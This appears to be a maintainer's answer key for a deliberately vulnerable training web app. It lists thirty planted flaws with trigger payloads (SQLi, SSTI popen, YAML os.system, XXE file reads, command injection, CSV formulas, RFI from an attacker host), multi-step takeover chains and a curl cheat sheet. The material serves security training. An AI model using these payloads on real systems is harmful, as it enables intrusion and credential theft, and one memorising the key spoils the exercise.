# Vulnerability Map — Knowledge Sharing Portal

> **Local maintainer reference only.** Not shipped, not committed.
> This file is gitignored and dockerignored.

This catalogues every planted vulnerability, the file it lives in, and a
representative trigger. It is the authoritative answer key.

## 29 Vulnerability Classes (+1 LFI/RFI variant = 30)

| # | Class | Location | Trigger |
|---|---|---|---|
| 1 | **SQLi** | `app/internal/routes.py` (`/week`) | `POST /week` with `query=` set to base64-encoded SQL. Decoded statement is fed directly to `db.execute`. |
| 2 | **XSS (Reflected)** | `app/auth/routes.py` + `app/templates/auth/forgot_password.html` (`email \| safe`) | `GET /forgot-password?email=<script>alert(1)</script>` |
| 3 | **XSS (Stored)** | `app/admin/routes.py` + `app/templates/slots/my_activity.html` (`approval_reason \| safe`, etc.) | Admin enters `<script>` in approve/reject reason or feedback. |
| 4 | **CMDi** | `app/admin/health.py::ping` | `POST /admin/health/ping host=127.0.0.1; id` — uses `shell=True`. Requires admin. |
| 5 | **XXE** | `app/slots/xml_import.py` | Upload XML with `<!DOCTYPE [<!ENTITY xxe SYSTEM "file:///app/app/config.py">]>` to `POST /admin/slots/import`. Parser uses `resolve_entities=True`. |
| 6 | **SSTI** | `app/slots/xml_import.py::preview` | `POST /admin/slots/preview topic={{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}`. Uses `render_template_string`. |
| 7 | **PathTraversal** | `app/uploads/routes.py::code` + `app/profile/routes.py::serve_avatar` | `GET /uploads/code?file=../../../../etc/passwd` (original surface, inverted check). Avatar serve double-decodes filename. |
| 8 | **NoSQLi** | `app/comments/routes.py::search_comments` + `app/comments/store.py` | `POST /api/comments/search {"filter":{"author_email":{"$ne":null}}}`. Filter dict fed straight into Mongo `find()`. |
| 9 | **AuthBypass** | `app/api/routes.py::legacy_user` | `GET /api/users/1 -H "X-Forwarded-For: 127.0.0.1"` returns user info without a session cookie. |
| 10 | **BAC** | `app/api/routes.py`, `app/admin/routes.py` | Legacy `/api/users/<id>` lacks role check; admin slot action allows self-approval. |
| 11 | **IDOR** | `app/slots/routes.py::book_slot` accepts `user_id` form field; `app/admin/routes.py::feedback` returns activity by id for any authed user. |
| 12 | **JWT** | `app/auth/tokens.py::decode_token` | Falls back to `verify_signature=False` if HMAC verify fails → forge `alg:none` token to impersonate any email. |
| 13 | **SSRF** | `app/admin/health.py::url_check` + `app/slots/routes.py::book_slot` | URL check blocks literal `127.0.0.1`/`localhost`; `169.254.169.254`, `[::1]`, decimal IPs bypass. Chain reaches IMDS responder for IAM creds. |
| 14 | **CORS** | `app/__init__.py::_api_cors` after-request handler | Any `/api/*` response reflects `Origin` verbatim with `Allow-Credentials: true`. |
| 15 | **CSRF** | JSON endpoints under `/api/*` (no token check), legacy admin feedback form. | `POST /api/profile` with `Content-Type: application/json` from an attacker page. |
| 16 | **FileUpload** | `app/profile/routes.py::upload_avatar` | Content-Type allow-list only; SVG-with-script accepted, served back via `serve_avatar` → stored XSS. |
| 17 | **HostHeader** | `app/auth/routes.py::forgot_password`, `app/auth/magic_link.py::request_link` | Reset / magic-link URL built from `X-Forwarded-Host`. Poisoned link emailed to victim. |
| 18 | **MassAssignment** | `app/profile/routes.py::api_profile` | `PATCH /api/profile {"role":"admin","points":99999,"email_verified":true}`. |
| 19 | **OpenRedirect** | `app/auth/routes.py::login` + `app/utils/redirects.py::is_safe_next` | `POST /login?next=//evil.com/pwn` — `is_safe_next` only blocks `http(s)://` prefix. |
| 20 | **OAuth** | `app/auth/oauth.py` | `redirect_uri` validated via `startswith` — `https://app.corp.com.attacker.com` passes. State stored in browser-controlled cookie. |
| 21 | **Deserialization** | `app/profile/routes.py::import_preferences` | Upload YAML with `!!python/object/apply:os.system ["id"]` to `POST /profile/preferences/import`. `yaml.load` with default Loader. |
| 22 | **RaceCondition** | `app/slots/routes.py::book_slot` (TOCTOU between select and update); magic-link token consumption non-atomic. | Two parallel `POST /book-slot` against the same slot both succeed. |
| 23 | **CachePoisoning** | `nginx/nginx.conf` caches `/about`, `/team`, `/help` keyed on path only; `app/pages/routes.py` reflects `X-Forwarded-Host` into `<link rel="canonical">`. | `GET /about -H "X-Forwarded-Host: evil.com"` poisons cache for ~60s. |
| 24 | **RequestSmuggling** | `nginx/nginx.conf` (`proxy_http_version 1.1` + keepalive) + pinned `gunicorn==21.2.0`. | Standard CL.TE / TE.0 desync probes through the nginx front. |
| 25 | **MagicLink** | `app/auth/magic_link.py` | Token = `md5(email + minute_bucket)`; reusable; link host from `X-Forwarded-Host`. |
| 26 | **LDAPInjection** | `app/directory/routes.py::search` | `GET /directory/search?q=*)(uid=*` returns all entries. String-formatted filter. |
| 27 | **XPathInjection** | `app/directory/routes.py::legacy_lookup` | `GET /directory/legacy?email=' or '1'='1` — returns first match. String-formatted XPath. |
| 28 | **PrototypePollution** *(server-side class pollution)* | `app/profile/preferences.py::deep_merge` invoked by `POST /api/profile/preferences` | Dotted-path payloads can write to any nested key; chain to logic gates that read prefs. |
| 29 | **CSVInjection** | `app/admin/export.py` | Book a slot with topic starting `=SUM(1+1)*cmd|'/c calc'!A1`. Admin exports CSV → opens in Excel → formula fires. |
| 30 | **FileInclusion (LFI/RFI)** | `app/pages/routes.py::static_page` | `GET /page?name=../../../config.py` reads SECRET_KEY default; `GET /page?name=http://attacker/payload` fetches remote HTML. |

## Business Logic Flaws

| # | Flaw | Location |
|---|---|---|
| BL1 | Book slot in the past (no server-side date check) | `app/slots/routes.py::book_slot` |
| BL2 | Edit approved slot details after approval (no state-machine guard) | `app/slots/routes.py::edit_slot` |
| BL3 | Negative `points_awarded` accepted | `app/admin/routes.py::feedback` (no min on `int(points)`) |
| BL4 | TOCTOU on slot booking — non-transactional check+update | `app/slots/routes.py::book_slot` |
| BL5 | Admin can approve their own bookings (no self-approval check) | `app/admin/routes.py::slot_action` |
| BL6 | Cancel-after-points-awarded keeps the points but frees the slot | `app/slots/routes.py::cancel_slot` |
| BL7 | No rate limit on `forgot-password` / magic-link request | `app/auth/routes.py::forgot_password`, `app/auth/magic_link.py` |
| BL8 | OAuth state stored in cookie only, not bound to a server session | `app/auth/oauth.py::callback` |
| BL9 | Feedback can be overwritten unlimited times silently | `app/admin/routes.py::feedback` |

## Headline Chains

**Chain A (low-priv → RCE)**
1. Poison reset link via `X-Forwarded-Host` on `/forgot-password`.
2. Receive admin reset link at attacker host (mailhog or X-Forwarded-Host-rewritten URL).
3. Reset admin password.
4. Login admin → XML import with XXE → read `app/config.py` → SECRET_KEY.
5. `POST /admin/slots/preview` with Jinja gadget → RCE.

**Chain B (unauth → admin)**
1. Cache poisoning on `/about` via `X-Forwarded-Host`.
2. Next admin visits poisoned page → injected `<script>` reads JWT cookie.
3. Replay JWT → admin → CMDi via health console.

**Chain C (IDOR → SSO takeover)**
1. Sign up as regular user.
2. `PATCH /api/profile {"role":"admin"}` — mass assignment.
3. Browse OAuth flow with `redirect_uri=https://app.corp.com.attacker.com/cb`.
4. Steal `code` from any SSO user who clicks the attacker-crafted link.

## Quick Trigger Cheat Sheet

```bash
# alg:none JWT impersonation
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(printf '{"email":"admin@example.com","exp":99999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -b "token=$HEADER.$PAYLOAD." http://localhost:5000/profile

# Mass assignment to admin (any authed user)
curl -X PATCH http://localhost:5000/api/profile -b token=<JWT> \
  -H 'Content-Type: application/json' -d '{"role":"admin"}'

# LFI: read SECRET_KEY default
curl 'http://localhost:5000/page?name=../../../config.py'

# Open redirect via login next=
curl -i 'http://localhost:5000/login?next=//evil.com/pwn' \
  -d 'email=user@example.com&password=password'

# Base64 SQLi via /week
PAYLOAD=$(printf 'SELECT email,password FROM users' | base64 -w0)
curl -X POST http://localhost:5000/week -b token=<JWT> -d "query=$PAYLOAD"

# XPath inject
curl --get --data-urlencode "email=' or '1'='1" http://localhost:5000/directory/legacy

# LDAP inject (returns all)
curl 'http://localhost:5000/directory/search?q=*)(uid=*' -b token=<JWT>

# X-Forwarded-For auth bypass
curl -H 'X-Forwarded-For: 127.0.0.1' http://localhost:5000/api/users/1

# Host header poison on reset
curl -H 'X-Forwarded-Host: evil.com' -X POST http://localhost:5000/forgot-password \
  -d 'email=admin@example.com'
```
